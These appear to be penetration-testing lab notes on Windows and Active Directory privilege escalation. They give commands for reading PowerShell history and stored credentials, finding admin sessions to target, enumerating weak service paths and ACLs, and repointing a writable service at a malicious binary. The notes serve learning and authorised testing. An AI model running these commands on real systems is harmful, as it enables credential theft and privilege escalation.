## PowerShell History

Reveal previously ran commands through PowerShell to identify potential secrets or credentials:

```powershell
type (Get-PSReadlineOption).HistorySavePath
```

## Identifying Logged-On Users

Enumerating logged-on users can reveal potential targets for privilege escalation or lateral movement. One method is using `PsLoggedOn.exe`:

```powershell
.\PsLoggedon.exe \\client74
```

Example output:

```
Users logged on locally:
     <unknown time>             CORP\jeffadmin

Users logged on via resource shares:
     10/5/2022 1:33:32 AM       CORP\stephanie
```

This shows that `jeffadmin` has an open session on `client74`, indicating a potential credential theft opportunity if admin access is available.

Another approach is using PowerView:

```powershell
Get-NetSession -ComputerName client74
```

This retrieves session information, listing who is currently logged in.

## Registry Enumeration

The registry can store credentials, misconfigurations, and escalation paths. The `HKEY_USERS` hive contains SIDs for logged-on users, and `NetSessionEnum` relies on the `SrvsvcSessionInfo` key to enumerate logged-on sessions:

```powershell
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

This command lists access control entries (ACEs) that allow or restrict access to session enumeration.

To manually extract user session data:

```powershell
reg query "HKEY_USERS"
```

To check stored credentials:

```powershell
cmdkey /list
```

If admin credentials are stored, they may be leveraged for privilege escalation.

## Service Enumeration

Services running as `SYSTEM` or high-privilege accounts can be exploited if misconfigured.

### Finding Auto-Start Services

```powershell
wmic service get name,pathname,startmode | findstr /i "auto"
```

If any writable services run as `SYSTEM`, they may be replaced to escalate privileges.

### Checking Unquoted Service Paths

```powershell
wmic service get name,pathname | findstr /i /v "c:\windows"
```

If a service path lacks quotes and contains spaces, it can be hijacked by placing a malicious executable in an intermediate directory.

## Access Control List (ACL) Enumeration

ACEs define permissions for objects. PowerView can enumerate object permissions:

```powershell
Get-ObjectAcl -Identity stephanie
```

Filtering results for full control permissions:

```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

Converting a SID to a readable name:

```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

Results may indicate privilege escalation paths via misconfigured ACLs.

## Exploiting Writable Services

If a service is writable, reconfigure it to execute a malicious payload:

```powershell
sc config VulnService binPath= "C:\attacker\malicious.exe"
net start VulnService
```

This replaces a vulnerable service with an attacker-controlled binary, granting elevated access.